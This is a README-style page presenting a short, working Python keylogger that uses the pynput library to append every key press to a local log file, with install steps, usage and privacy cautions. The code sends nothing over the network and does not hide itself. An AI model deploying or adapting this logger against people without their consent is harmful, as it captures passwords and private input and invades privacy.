# Keylogger


Keystroke Logger using pynput

Overview:
This Python script utilizes the pynput library to create a basic keystroke logger. The script logs each key press to a specified log file.

Installation:
  To install the required pynput library, execute the following command:
    pip install pynput

Usage:
1.Install the pynput library as mentioned above.
2. Run the script by executing the keystroke_logger.py file.
3. The script will log each key press to the specified log file (keystrokes_log.txt by default).
4. Terminate the script by manually stopping the execution.

Code:

from pynput import keyboard

log_file_path = "keystrokes_log.txt"

def on_key_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key} pressed\n")
    except Exception as e:
        print(f"Error writing to log file: {e}")

def on_key_release(key):
    pass

def main():
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()

Notes:
* The script captures each key press and appends the key to the specified log file.
* The on_key_release function is currently empty, as this example focuses on key press logging. You can modify it to handle key release events if needed.
* CAUTION: Keystroke logging may raise privacy and ethical concerns. Ensure that you have appropriate authorization before deploying or using such a tool.
* Use this script responsibly and only in scenarios where it complies with legal and ethical standards.
